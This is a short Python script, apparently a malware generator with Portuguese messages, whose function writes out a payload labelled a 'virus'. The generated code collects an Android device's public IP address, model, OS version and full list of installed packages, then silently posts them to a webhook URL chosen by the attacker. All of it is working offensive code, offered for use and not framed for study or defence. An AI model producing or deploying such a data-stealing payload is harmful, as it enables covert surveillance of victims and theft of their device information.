def generate_virus(target_url: str, name: str):
    code = f'''import os
import subprocess
import time
import requests

# Seu webhook
WEBHOOK_URL = "{target_url}"

def get_device_info():
    try:
        info = {{
            'ip': requests.get("https://api.ipify.org").text,
            'model': subprocess.check_output(["getprop", "ro.product.model"]).decode().strip(),
            'version': subprocess.check_output(["getprop", "ro.build.version.release"]).decode().strip(),
            'apps': subprocess.check_output(["pm", "list", "packages"]).decode().strip()
        }}
        return info
    except:
        return {{'error': 'Falha ao obter dados'}}

def send_data():
    info = get_device_info()
    try:
        requests.post(WEBHOOK_URL, json=info)
    except:
        pass

send_data()
'''
    with open(f"{name}.py", "w") as f:
        f.write(code)
    print(f"[+] Vírus '{name}.py' gerado com sucesso!")
